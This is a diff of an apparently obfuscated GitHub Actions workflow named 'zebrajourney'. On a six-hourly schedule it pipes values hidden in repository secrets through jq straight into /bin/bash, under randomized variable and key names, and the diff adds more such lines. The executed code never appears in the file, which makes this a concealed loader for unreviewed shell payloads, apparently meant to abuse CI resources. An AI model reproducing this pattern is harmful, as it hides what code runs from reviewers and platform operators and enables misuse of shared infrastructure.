@@ -1,21 +1,30 @@
 name: zebrajourney
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
-
-jobs:  # 28136
+    - cron: '39 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zebrajourney
         env:
-          uwewt95728: ${{ secrets.uwewt95728 }}
+          to88: ${{ secrets.to88 }}
         run: |
-          echo $uwewt95728 | jq -r .kjel3241 | /bin/bash
-          echo $smts18639 | jq -r .vovyw29626 | /bin/bash
-          echo $twtmo76784 | jq -r .hqvza84697 | /bin/bash
-          echo $qvla8 | jq -r .za713 | /bin/bash
+          echo $to88 | jq -r .w4215 | /bin/bash
+          echo $fuipm127 | jq -r .dqg53445 | /bin/bash
+          echo $hzvly31585 | jq -r .ys27120 | /bin/bash
+          echo $udg082 | jq -r .m7 | /bin/bash
+          echo $veou748 | jq -r .pbf2 | /bin/bash
+          echo $fc6 | jq -r .gqvpp65307 | /bin/bash
+          echo $oomuy12734 | jq -r .jl58 | /bin/bash
+          echo $n7472 | jq -r .jjfy470 | /bin/bash
+          echo $hp07 | jq -r .izy7307 | /bin/bash
+          echo $hfjt93 | jq -r .r444 | /bin/bash
+          echo $r816 | jq -r .ek386 | /bin/bash
+          echo $kwzc11 | jq -r .zs7046 | /bin/bash
+          echo $kj69 | jq -r .opdg1 | /bin/bash
+          echo $dop19053 | jq -r .be19629 | /bin/bash
+          echo $vbxo722 | jq -r .jqg96 | /bin/bash
 
